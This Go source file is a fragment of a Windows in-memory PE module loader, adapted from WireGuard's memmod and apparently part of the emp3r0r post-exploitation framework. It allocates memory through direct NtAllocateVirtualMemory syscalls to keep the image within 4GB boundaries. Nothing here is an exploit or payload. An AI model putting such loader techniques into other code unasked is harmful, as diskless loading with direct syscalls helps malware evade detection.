//go:build (windows && amd64) || (windows && arm64)

/* SPDX-License-Identifier: MIT
 *
 * Copyright (C) 2017-2026 WireGuard LLC. All Rights Reserved.
 */

package memmod

import (
	"fmt"

	ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

func (opthdr *IMAGE_OPTIONAL_HEADER) imageOffset() uintptr {
	return uintptr(opthdr.ImageBase & 0xffffffff00000000)
}

func (module *Module) check4GBBoundaries(alignedImageSize uintptr) (err error) {
	for (module.codeBase >> 32) < ((module.codeBase + alignedImageSize) >> 32) {
		node := &addressList{
			next:    module.blockedMemory,
			address: module.codeBase,
		}
		module.blockedMemory = node
		baseAddr := uintptr(0)
		regionSize := alignedImageSize
		status, allocErr := ntsyscall.NtAllocateVirtualMemory(module.table, windows.CurrentProcess(), &baseAddr, 0, &regionSize, windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
		if allocErr != nil || status != ntsyscall.STATUS_SUCCESS {
			module.codeBase = 0
			return fmt.Errorf("Error allocating memory block: 0x%08X, %w", status, allocErr)
		}
		module.codeBase = baseAddr
	}
	return
}
